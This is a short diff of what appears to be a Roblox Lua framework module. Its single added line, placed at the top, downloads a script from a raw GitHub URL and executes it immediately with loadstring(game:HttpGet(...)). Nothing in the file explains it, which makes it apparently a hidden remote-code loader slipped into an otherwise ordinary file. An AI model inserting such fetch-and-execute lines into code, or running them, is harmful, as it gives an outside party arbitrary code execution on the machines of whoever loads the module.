@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tngaming123/API/refs/heads/main/anthor"))()
 local framework = setmetatable({
 	dependencies = {
 		utils = {}
